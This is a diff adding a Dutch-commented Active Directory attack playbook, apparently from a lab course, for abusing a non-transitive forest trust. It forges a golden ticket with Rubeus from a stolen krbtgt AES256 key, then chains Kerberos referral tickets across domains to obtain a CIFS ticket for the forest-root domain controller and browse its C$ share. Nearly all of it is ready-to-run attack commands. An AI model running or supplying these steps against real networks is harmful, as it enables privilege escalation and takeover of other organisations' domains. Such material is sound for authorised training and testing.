@@ -1,0 +1,37 @@
+# Non-Transitive Trust Abuse — Referral chain TGT hopping
+# Gebruik een keten van Kerberos referrals om via een non-transitive trust toegang te krijgen
+
+# === Context ===
+# Normaal: eu.local (non-transitive trust) → us.techcorp.local → techcorp.local
+# eu.local kan NIET direct bij techcorp.local vanwege non-transitive trust
+# Maar: via referral chain hopping kan dit wel als je DA bent in eu.local
+
+# === Vereisten ===
+# - Domain Admin in het bron-forest (eu.local)
+# - krbtgt AES256 key van het bron-domein
+
+# === Stap 1: Golden Ticket voor bron-domein ===
+Rubeus.exe evasive-golden /aes256:KRBTGT_AES256_EU /ldap /sid:SID_EU /user:Administrator /domain:eu.local /printcmd
+
+# Voer het gegenereerde commando uit met /nowrap (geen /ptt)
+
+# === Stap 2: Vraag referral TGT aan voor het direct vertrouwde domein ===
+Rubeus.exe asktgs /service:krbtgt/us.techcorp.local /dc:eu-dc.eu.local /nowrap /ticket:GOLDEN_TICKET_BASE64
+
+# === Stap 3: Gebruik referral om "lokale" TGT te krijgen ===
+Rubeus.exe asktgs /service:krbtgt/us.techcorp.local /dc:us-dc.us.techcorp.local /targetdomain:us.techcorp.local /nowrap /ticket:REFERRAL_TGT_BASE64
+
+# === Stap 4: Vraag referral aan voor het forest root domein ===
+Rubeus.exe asktgs /service:krbtgt/techcorp.local /dc:us-dc.us.techcorp.local /targetdomain:us.techcorp.local /nowrap /ticket:LOCAL_TGT_BASE64
+
+# === Stap 5: Vraag service ticket aan voor het doel ===
+Rubeus.exe asktgs /service:CIFS/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /nowrap /ptt /ticket:FOREST_ROOT_REFERRAL_BASE64
+
+# === Verificatie ===
+klist
+dir \\techcorp-dc.techcorp.local\c$
+
+# Noot: Elke stap produceert een nieuw ticket dat input is voor de volgende stap
+# Noot: De /targetdomain parameter is cruciaal om de juiste referral te krijgen
+# Noot: Dit werkt omdat Kerberos referrals de trust transitivity niet checken
+# Noot: Vereist DA in het bron-domein voor de initiële golden ticket
